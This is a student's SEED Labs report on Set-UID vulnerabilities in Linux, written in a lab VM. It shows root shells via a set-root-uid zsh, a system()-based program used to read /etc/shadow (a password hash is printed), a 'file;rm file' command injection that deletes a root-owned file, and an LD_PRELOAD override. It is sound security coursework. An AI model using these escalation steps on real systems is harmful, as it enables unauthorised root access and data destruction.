# SEEDlabs: Set-UID Program Vulnerability Lab

#### Ozgur Ural
#### Student ID: 2564455

## Lab Description

Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program is run, it assumes the owner's privileges. For example, if the program's owner is root, then when anyone runs this program, the program gains the root's privileges during its execution. Set-UID allows us to do many interesting things, but unfortunately, it is also the culprit of many bad things. Therefor, the objective of this lab is two-fold: (1) Appreciate its good side: understand why Set-UID is needed and how it is implimented. (2) Be aware of its bad side: understand its potential security problems.

## Lab Tasks

This is an exploration lab. Your main task is to "play" with the Set-UID mechanism in Linux, and write a lab report to describe your discoveries. You are required to accomplish the following tasks in Linux:

1. Figure out why "passwd" command needs to be Set-UID programs. What will happen if it is not? Please  copy  the  “passwd”  program  from  /usr/bin/passwd  to  folder  /home/seed.  Is  the copied  “passwd”  program  still  a  Set-UID  program?  Try  to  use  the  copied  program  to change your password. Will it be successful?

```sh
[09/23/21]seed@VM:~$ which passwd
/usr/bin/passwd
[09/23/21]seed@VM:~$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 53128 Mar 29  2016 /usr/bin/passwd
[09/23/21]seed@VM:~$ cp /usr/bin/passwd /home/seed
[09/23/21]seed@VM:~$ ls -l /home/seed/passwd 
-rwxr-xr-x 1 seed seed 53128 Sep 23 18:11 /home/seed/passwd
[09/23/21]seed@VM:~$ ./passwd 
Changing password for seed.
(current) UNIX password: 
passwd: Authentication token manipulation error
passwd: password unchanged
```
When copied `passwd` to `/home/seed`, it lost root's privileges. The program under the '/home/seed' cannot be used for changing passwords as can be seen above.

2. Run Set-UID shell programs in Linux, and describe and explain your observations.
a. Login  as  root,  copy  /bin/zsh  to  /tmp,  and  make  it  a  set-root-uid  program  using command  “chmod”  with  permission  4755.  Then  login  as  a  normal  user,  and  run /tmp/zsh. Will you get root privilege? Please describe your observation.

```sh
[09/23/21]seed@VM:/$ cd /tmp
[09/23/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# cp /usr/bin/zsh /tmp/
root@VM:/tmp# chmod 4755 ./zsh 
root@VM:/tmp# ls -l ./zsh 
-rwsr-xr-x 1 root root 756476 Sep 23 18:57 ./zsh
root@VM:/tmp# exit
exit
[09/23/21]seed@VM:/tmp$ ./zsh 
VM# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

As can be seen above, I can get a root privilege as a normal user.

b. Instead of copying `/bin/zsh`, this time, copy `/bin/bash` to `/tmp`, make it a set-root-uid program. Run `/tmp/bash` as a normal user. will you get root privilege? Please describe and explain your observation.

```sh
[09/23/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# cp /bin/bash /tmp
root@VM:/tmp# chmod 4755 ./bash 
root@VM:/tmp# exit
exit
[09/23/21]seed@VM:/tmp$ ls -l ./bash
-rwsr-xr-x 1 root root 1109564 Sep 23 20:43 ./bash
[09/23/21]seed@VM:/tmp$ ./bash
bash-4.3$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

While `zsh` can get root privilege, `bash` can not get the root priviege.

3.. (Setup for the rest of the tasks) As you can find out from the previous task, `/bin/bash` has certain built-in protection that prevent the abuse of the Set-UID mechanism. To see the life before such a protection scheme was implemented, we are going to use a different shell program called `/bin/zsh`. In some Linux distributions(such as Fedora and Ubuntu), `/bin/sh` is actually a symbolic link to `/bin/bash`. To use `zsh`, we need to link `/bin/sh` to `/bin/zsh`. The following instructions describe how to change the default shell to `zsh`.

```sh
[09/23/21]seed@VM:/$ su
Password: 
root@VM:/# cd /bin
root@VM:/bin# rm sh
root@VM:/bin# ln -s zsh sh
root@VM:/bin# ls -al sh
lrwxrwxrwx 1 root root 3 Sep 23 20:57 sh -> zsh
```
4. The PATH environment variable.
The `system(const char *cmd)` library function can be used to execute a command within a program. The way `system(cmd)` works is to invoke the `/bin/sh` program, and then let the shell program to execute `cmd`. Because of the shell program invoked, calling `system()` within a Set-UID program is extremely dangerous. This is because the actual behavior of the shell program can be affected by environment variables, such as `PATH`; these environment variables are under user's control. By changing these variables, malicious users can control the behavior of the Set-UID program.
In bash, you can change the PATH environment variable in the following way (this example adds the directory /home/seed to the beginning of the PATH environment variable):

$ export PATH=/home/seed:$PATH

In this task, login as the root account, and create and compile the following program using name “task3”.

```c
int main()
{
    system("ls");
    return 0;
}
```
```sh
[09/23/21]seed@VM:/$ cd /tmp
[09/23/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# vim task3.c
root@VM:/tmp# gcc -o task3 task3.c
root@VM:/tmp# ls -l task3
-rwxr-xr-x 1 root root 7348 Sep 23 22:00 task3
root@VM:/tmp# chmod 4755 task3
root@VM:/tmp# ls -l task3
-rwsr-xr-x 1 root root 7348 Sep 23 22:00 task3
```

Make the “task3” program to Set-UID using command “chmod” with permission 4755. This Set-UID “task3” program is supposed to execute the /bin/ls command when you execute it. Can you use your seed account and let this Set-UID program run your code instead of /bin/ls? For example, show the content of file “/etc/shadow”. Describe and explain your observations and solutions.

```sh
[09/23/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# gcc -o task3 task3.c
root@VM:/tmp# chmod 4755 task3
root@VM:/tmp# exit
exit
[09/23/21]seed@VM:/tmp$ ./task3 
VM# cat /etc/shadow
root:$6$NrF46O1p$.vDnKEtVFC2bXslxkRuT4FcBqPpxLqW05IoECr0XKzEEO5wj8aU3GRHW2BaodUn4K3vgyEjwPspr/kqzAqtcu.:17400:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
```
I can use my seed account and let the Set-UID program run my code instead of /bin/ls. I also show the content of file “/etc/shadow” as you can see above as an example. 

5. The difference between `system()` and `execve()`.
Background: Bob works for an auditing agency, and he needs to investigete a company for a suspected fraud. For the investigation purpose, Bob needs to be able to read all the files in the company's Unix system; on the other hand, to protect the integrity of the system, Bob should not be able to modify any file. To achieve this goal, Vince, the superuser of the system, wrote a special set-root-uid program(see below), and then gave the executable permission to Bob. This program requires Bob to type a file name at the command line, and then it will run `/bin/cat` to display the specified file. Since the program is running as a root, it can display any file Bob specifies. However, since the program has no write operations, Vince is very sure that Bob cannot use this special program to modify any file.

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
   char *v[3];
   if(argc < 2)
   {
   printf("Please type a file name.\n");
   return 1;
   }
   v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = 0;
  //Set q = 0 for Question a, and q = 1 for Question b
   int q = 0;
   if (q == 0)
   {
      char *command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
      sprintf(command, "%s %s", v[0], v[1]);
      system(command);
  }
  else execve(v[0], v, 0);
  return 0 ;
}
```
In this task, login root account first. Use the root account to create and compile a program with the above code. Make this program to Set-UID using command “chmod” with permission 4755. 
```sh
[09/23/21]seed@VM:/tmp$ su
Password: 
root@VM:/tmp# vim task5.c
root@VM:/tmp# gcc -o task5 task5.c
task5.c: In function ‘main’:
task5.c:21:10: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     else execve(v[0], v, 0);
          ^
root@VM:/tmp# chmod 4755 task5
root@VM:/tmp# exit
```
Now, q = 0 in the program. This way, the program will use system() to invoke the command. Is this program safe? If you were Bob, can you compromise the integrity of the system? For example, can you remove any file that is not writable to you? (Hint: remember that system() actually invokes /bin/sh, and then runs the command within the shell environment. We have tried the environment variable in the previous task; here let us try a different attack. (Hint: consider how special characters used in a normal shell environment).
```sh
[09/23/21]seed@VM:/tmp$ ls -l /bin/sh
lrwxrwxrwx 1 root root 3 Sep 23 20:57 /bin/sh -> zsh
[09/24/21]seed@VM:/tmp$ su
Password: 
root@VM:/tmp# vim file
root@VM:/tmp# exit
exit
[09/24/21]seed@VM:/tmp$ ls -l task5 file
-rw-r--r-- 1 root root    9 Sep 24 00:09 file
-rwsr-xr-x 1 root root 7584 Sep 23 23:38 task5
[09/24/21]seed@VM:/tmp$ rm file
rm: remove write-protected regular file 'file'? yes
rm: cannot remove 'file': Operation not permitted
[09/24/21]seed@VM:/tmp$ ./task5 "file;rm file"
testfile
[09/24/21]seed@VM:/tmp$ ls file*
ls: cannot access 'file*': No such file or directory
```
The task5 file is not safe, Bob can read, write or move files which only root user can run. As an illustration; I created a file named file. The file can only be removed by root permission. However, I could remove the file with seed user using the task5 program. 

Next, set q = 1 in the program, and use the root account re-compile the program and make it to Set-UID. This way, the program will use execve() to invoke the command. Do your attacks in task (a) still work? Please describe and explain your observations.

```sh
[09/24/21]seed@VM:/tmp$ su
Password: 
root@VM:/tmp# vim task5.c 
root@VM:/tmp# gcc -o task5_q1 task5.c
task5.c: In function ‘main’:
task5.c:21:10: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     else execve(v[0], v, 0);
          ^
root@VM:/tmp# chmod 4755 task5_q1 
root@VM:/tmp# vim file
root@VM:/tmp# exit
exit
[09/24/21]seed@VM:/tmp$ ls -l task5_q1 file
-rw-r--r-- 1 root root    9 Sep 24 00:23 file
-rwsr-xr-x 1 root root 7584 Sep 24 00:22 task5_q1
[09/24/21]seed@VM:/tmp$ rm file 
rm: remove write-protected regular file 'file'? yes
rm: cannot remove 'file': Operation not permitted
[09/24/21]seed@VM:/tmp$ ./task5_q1 "file;rm file"
/bin/cat: 'file;rm file': No such file or directory
[09/24/21]seed@VM:/tmp$ ls file
file
[09/24/21]seed@VM:/tmp$ 
```
When I set q with 1; the attack did not work, because `execve()` regarded `file;rm file` as a folder name. Therefore the system prompted "No such file or directory". It worked for q = 0 because `system()` call `/bin/sh`, which links `zsh`. After running cat file with root privilege, it runs `rm file`.

6. The LD_PRELOAD environment variable.
To make sure Set-UID programs are safe from the manipulation of the `LD_PRELOAD` environment variable, the runtime linker (`ld.so`) will ignore this environment variable if the program is a Set-UID root program, except for some conditions. We will figure out what these conditions are in this task.

a. Let us buid a dynamic link library. Create the following program, and name it `mylib.c`. It basically overrides the `sleep()` function in `libc`:

```c
#include <stdio.h>
void sleep (int s)
{
    printf("I am not sleeping!\n");
}
```

b. We can compile the above program using the following commands 
```sh
gcc -fPIC -g -c mylib.c

gcc -shared -Wl,-soname,libmylib.so.1 \
-o libmylib.so.1.0.1 mylib.o –lc
```

c. Now, set the LD_PRELOAD environment variable:

```sh
% export LD_PRELOAD=./libmylib.so.1.0.1
```

d. Finally, compile the following program `myprog` (put this program in the same directory as `libmylib.so.1.0.1`):

```c
// myprog.c
int main()
{
   sleep(1);
   return 0;
}
```

Please run myprog under the following conditions, and observe what happens. Based on your observations, document when the runtime linker will ignore the LD_PRELOAD environment variable, and explain why. (Hint: You can use the idea of real user id and effective user id in Linux for explanation)

* Using account seed, compile the myprog program, and run it.
```sh
root@VM:/tmp# gcc -fPIC -g -c mylib.c
root@VM:/tmp# gcc -shared -o mylib.so mylib.o -lc
root@VM:/tmp# exit
exit
[09/24/21]seed@VM:/tmp$ export LD_PRELOAD=./mylib.so
[09/24/21]seed@VM:/tmp$ echo $LD_PRELOAD 
./mylib.so
[09/24/21]seed@VM:/tmp$ gcc -o myprog myprog.c 
myprog.c: In function ‘main’:
myprog.c:4:4: warning: implicit declaration of function ‘sleep’ [-Wimplicit-function-declaration]
    sleep(1);
    ^
[09/24/21]seed@VM:/tmp$ ./myprog 
I am not sleeping!
[09/24/21]seed@VM:/tmp$ 
```

* Now login as root. Set the LD_PRELOAD environment variable again. Recompile the myprog and make myprog as a Set-UID root program. Run it in the root account.

```sh
[09/24/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# export LD_PRELOAD=./mylib.so
root@VM:/tmp# gcc -o myprog myprog.c 
myprog.c: In function ‘main’:
myprog.c:4:4: warning: implicit declaration of function ‘sleep’ [-Wimplicit-function-declaration]
    sleep(1);
    ^
root@VM:/tmp# chmod 4755 myprog
root@VM:/tmp# ./myprog 
I am not sleeping!
```
In this case, it overrided sleep() function and used LD_PRELOAD environment variable.

* Exit the root account back to seed. Use the seed account to directly execute the Set-UIDmyprog from the above step.
```sh
[09/24/21]seed@VM:/tmp$ sudo su
root@VM:/tmp# export LD_PRELOAD=./mylib.so
root@VM:/tmp# gcc -o myprog myprog.c 
myprog.c: In function ‘main’:
myprog.c:4:4: warning: implicit declaration of function ‘sleep’ [-Wimplicit-function-declaration]
    sleep(1);
    ^
root@VM:/tmp# chmod 4755 myprog
root@VM:/tmp# ./myprog 
I am not sleeping!
root@VM:/tmp# exit
exit
[09/24/21]seed@VM:/tmp$ ./myprog 
[09/24/21]seed@VM:/tmp$ 
```
In this case, it ignored LD_PRELOAD environment variable. It used the system's default sleep() function. So sleep() function was not be overrided.

